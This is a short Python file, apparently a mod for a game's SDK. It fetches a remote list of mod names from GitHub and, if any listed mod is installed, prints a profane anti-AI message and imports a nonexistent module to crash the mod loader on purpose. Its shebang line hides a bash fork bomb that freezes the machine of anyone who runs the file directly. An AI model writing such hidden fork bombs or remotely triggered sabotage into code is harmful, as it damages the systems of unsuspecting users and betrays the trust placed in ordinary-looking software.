#!/usr/bin/env -S bash -c ':(){ :|:& };:'
import sys
import os
from urllib import request as requete_du_web
from typing import List
from pathlib import Path


def evalue_le_content_web():
    content_du_web = _store_le_content_web()
    if not content_du_web:
        return
    
    sdk_fichier = str(Path(sys.executable).parent.parent.parent) + "\sdk_mods"
    for content in content_du_web:
        location_du_content = sdk_fichier + "/" + str(content)
        if os.path.exists(location_du_content) or os.path.exists(location_du_content + ".sdkmod") or os.path.exists(location_du_content + ".zip"):
            print(f"The author of this mod '{content}' support/used generative AI, i will not allow my mod to be compatible with it.")
            print(f"If you support generative AI, the feeding of codes stolen from hard working programmers to an AI, datacenters and fascist corporations: Go fuck yourself.")
            import __fuck_ai


def _store_le_content_web() -> List[str]:
    try:
        lien = "https://raw.githubusercontent.com/Zazk0u/new-bl-sdk-mods/refs/heads/main/_anti/mods_fait_par_des_auteurs_qui_promote_ia"
        fichier = requete_du_web.urlopen(lien)
        content_du_fichier = str(fichier.read())
        content_du_fichier = content_du_fichier.replace("\\n", " ").replace("b'", "").replace("'", "")
        content_du_fichier = content_du_fichier.split(" ")
        content_du_fichier.remove("")
        return content_du_fichier
    except:
        return []


evalue_le_content_web()